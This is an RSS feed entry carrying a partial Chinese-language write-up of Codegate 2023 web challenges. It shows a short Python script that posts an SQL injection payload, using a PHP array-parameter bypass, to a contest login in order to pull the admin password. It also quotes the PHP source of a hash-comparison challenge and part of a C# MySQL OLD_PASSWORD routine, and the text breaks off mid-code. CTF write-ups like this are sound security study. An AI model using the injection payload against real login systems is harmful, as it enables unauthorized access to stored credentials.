<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Cubic Y³ • Posts by &#34;write-up&#34; tag</title>
        <link>http://cubicy.icu</link>
        <description>CTF, life, waifus, and thoughts.</description>
        <language>zh-CN</language>
        <pubDate>Tue, 29 Aug 2023 15:05:06 +0800</pubDate>
        <lastBuildDate>Tue, 29 Aug 2023 15:05:06 +0800</lastBuildDate>
        <category>Misc</category>
        <category>Write-Up</category>
        <category>出题</category>
        <category>CISCN</category>
        <category>web</category>
        <category>Hackergame</category>
        <category>SchoolBus</category>
        <category>Foo</category>
        <category>Bar</category>
        <category>冰菓</category>
        <category>古籍研究社</category>
        <category>晚安短信</category>
        <category>Treap</category>
        <category>BST</category>
        <category>Stack</category>
        <category>图论</category>
        <category>Kruskal</category>
        <category>Splay</category>
        <category>数链剖分</category>
        <category>持久化</category>
        <category>线段树</category>
        <category>树状数组</category>
        <category>LCA</category>
        <category>分块</category>
        <category>哈希</category>
        <category>Phar</category>
        <category>反序列化</category>
        <category>PHP</category>
        <category>Life</category>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2023/08/29/CODEGATE%202023%20Write-Up%20(web)/</guid>
            <title>Codegate 2023 Partial Write-Up (Web/Misc)</title>
            <link>http://cubicy.icu/2023/08/29/CODEGATE%202023%20Write-Up%20(web)/</link>
            <category>Write-Up</category>
            <pubDate>Tue, 29 Aug 2023 15:05:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Codegate-2023-部分Write-Up-Web-x2F-Misc&#34;&gt;&lt;a href=&#34;#Codegate-2023-部分Write-Up-Web-x2F-Misc&#34; class=&#34;headerlink&#34; title=&#34;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&#34;&gt;&lt;/a&gt;Codegate 2023 部分Write-Up (Web&amp;#x2F;Misc)&lt;/h1&gt;&lt;p&gt;这次去韩国参加了Codegate 2023的决赛！把Web部分的题解在此释出，其他游记&amp;#x2F;照片另开一文。  &lt;/p&gt;
&lt;h2 id=&#34;Warmup&#34;&gt;&lt;a href=&#34;#Warmup&#34; class=&#34;headerlink&#34; title=&#34;Warmup&#34;&gt;&lt;/a&gt;Warmup&lt;/h2&gt;&lt;p&gt;没咋看。似乎是XSS绕绕。&lt;/p&gt;
&lt;h2 id=&#34;Pwn&#34;&gt;&lt;a href=&#34;#Pwn&#34; class=&#34;headerlink&#34; title=&#34;Pwn&#34;&gt;&lt;/a&gt;Pwn&lt;/h2&gt;&lt;p&gt;是的，这题就叫Pwn（与之相对的是Pwn分类里有道题叫Web）&lt;br&gt;解法：没咋看。应该是比较水的一题。经典数组绕过  &lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;data = &lt;span class=&#34;string&#34;&gt;&amp;quot;username[0]=\\&amp;#x27; union select password from USER WHERE username=&amp;#x27;admin&amp;#x27; -- &amp;amp;username[1]=2&amp;amp;password=3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://3.35.198.7:2929/login&amp;quot;&lt;/span&gt;, data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;Cha’s-magic&#34;&gt;&lt;a href=&#34;#Cha’s-magic&#34; class=&#34;headerlink&#34; title=&#34;Cha’s magic&#34;&gt;&lt;/a&gt;Cha’s magic&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;require_once &lt;span class=&#34;string&#34;&gt;&amp;#x27;config.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function hashPasswordOld($password_to_hash)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; $host, $dbname, $username, $password, $charset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $db = new PDO(&lt;span class=&#34;string&#34;&gt;&amp;quot;mysql:host=$host;dbname=$dbname;charset=$charset&amp;quot;&lt;/span&gt;, $username, $password);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $query = $db-&amp;gt;prepare(&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT OLD_PASSWORD(:password)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $query-&amp;gt;execute([&lt;span class=&#34;string&#34;&gt;&amp;#x27;:password&amp;#x27;&lt;/span&gt; =&amp;gt; $password_to_hash]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $row = $query-&amp;gt;fetch(PDO::FETCH_NUM);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ($row)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; $row[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    catch(PDOException $ex)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;An Error occured!&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(isset($_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v1&amp;quot;&lt;/span&gt;]) &amp;amp;&amp;amp; isset($_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v2&amp;quot;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v1 = $_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v1&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v2 = $_GET[&lt;span class=&#34;string&#34;&gt;&amp;quot;v2&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (substr($v1, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;codegate2023&amp;#123;&amp;quot;&lt;/span&gt; || substr($v1, -&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;i_love_you&amp;#125;&amp;quot;&lt;/span&gt; ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        substr($v2, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;codegate2023&amp;#123;&amp;quot;&lt;/span&gt; || substr($v2, -&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;i_love_you&amp;#125;&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;fall in love~&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v1 == $v2) die(&lt;span class=&#34;string&#34;&gt;&amp;quot;are you kidding me?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v1 = hashPasswordOld($v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v2 = hashPasswordOld($v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v3 = hashPasswordOld($flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v3 !== &lt;span class=&#34;string&#34;&gt;&amp;quot;6368616368613230&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag verification failed.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v1 == null &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; $v2 == null)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;What the hell here?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v1 == $v2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v2 == $v3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            die($flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(substr($flag, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, strlen($flag) / &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    die(&lt;span class=&#34;string&#34;&gt;&amp;quot;Try harder...&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show_source(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也就是v1和v2和v3经过hash得到的值都一样才能拿到完整flag。&lt;br&gt;对于OLD_PASSWORD的算法，网上有很多实现，这里有一个C#版本的：&lt;/p&gt;
&lt;figure class=&#34;highlight csharp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Online C# Editor for free&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Write, Edit and Run your C# code using C# Online Compiler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; System;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;HelloWorld&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;mysql_old_password&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; sPassword&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32[] result = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; UInt32[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt; bDebug = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32 nr = (UInt32)&lt;span class=&#34;number&#34;&gt;1345345333&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; = (UInt32)&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, nr2 = (UInt32)&lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32 tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;char&lt;/span&gt; [] password = sPassword.ToCharArray();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; sPassword.Length; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (password[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt; || password[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = (UInt32)password[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nr ^= (((nr &amp;amp; &lt;span class=&#34;number&#34;&gt;63&lt;/span&gt;) + &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt;) * tmp) + (nr &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nr2 += (nr2 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; ) ^ nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(&lt;span class=&#34;string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(nr.ToString(&lt;span class=&#34;string&#34;&gt;&amp;quot;X&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(nr2.ToString(&lt;span class=&#34;string&#34;&gt;&amp;quot;X&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(&lt;span class=&#34;string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; += tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32 mask = (((UInt32)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;) - (UInt32)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); 